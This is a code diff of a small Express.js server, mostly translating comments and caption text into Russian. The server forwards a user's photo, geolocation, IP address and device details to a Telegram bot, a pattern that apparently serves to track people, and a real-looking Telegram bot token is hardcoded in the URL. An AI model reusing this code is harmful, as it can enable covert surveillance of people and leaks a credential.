@@ -8,14 +8,16 @@ import ip from 'express-ip';
 const app = express();
 const PORT = 5000;
 
-app.set('trust proxy', true); // Установка app.set('trust proxy', true) для работы с прокси-сервером
+app.set('trust proxy', true); // Устанавливаем для Express доверие к прокси-серверу
 
-app.use(ip().getIpInfoMiddleware);
+app.use(ip().getIpInfoMiddleware); // Используем middleware для получения информации об IP адресе
+
 const storage = multer.memoryStorage();
 const upload = multer({ storage: storage });
 
 app.use(express.json());
 app.use(cors());
+
 
 app.post('/sendPhotoToTelegram', upload.single('photo'), async (req, res) => {
   const { chat_id, latitude, longitude, deviceInfo } = req.body;
@@ -39,13 +41,13 @@ app.post('/sendPhotoToTelegram', upload.single('photo'), async (req, res) => {
       knownLength: photo.size,
     });
 
-    const caption = `User Data:\n\n` +
-                    `🔋 Battery Level: In development\n` +
+    const caption = `Данные о пользователе:\n\n` +
+                    `🔋 Уровень батареи: In development\n` +
                     `📍 IP Address: ${userIP}\n` +
                     `🌐 Browser: ${deviceInfo.userAgent}\n` +
-                    `📱 Device Type: ${deviceInfo.deviceType}\n` +
-                    `🖥 Platform: ${deviceInfo.platform}\n` +
-                    `📏 Screen Resolution: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}`;
+                    `📱 Тип устройства: ${deviceInfo.deviceType}\n` +
+                    `🖥 Платформа: ${deviceInfo.platform}\n` +
+                    `📏 Разрешение экрана: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}`;
 
     formData.append('caption', caption);
 
@@ -68,7 +70,8 @@ app.post('/sendLocationToTelegram', async (req, res) => {
 
   try {
     const userIP = req.headers['x-forwarded-for'] || req.ipInfo.clientIp;
-    const apiUrl = `https://api.telegram.org/bot6725080038:AAECwpthmboWiyHKETLomRN-4mQgfK4vhfc/sendLocation`;
+
+    const apiUrl = `https://api.telegram.org/bot6725080038:AAECwpthmboWiyHKETLomRN-4mQgfK4vhfc/sendLocation`; // Замените <YOUR_BOT_TOKEN> на ваш токен бота
 
     const formData = new FormData();
     formData.append('chat_id', chat_id);
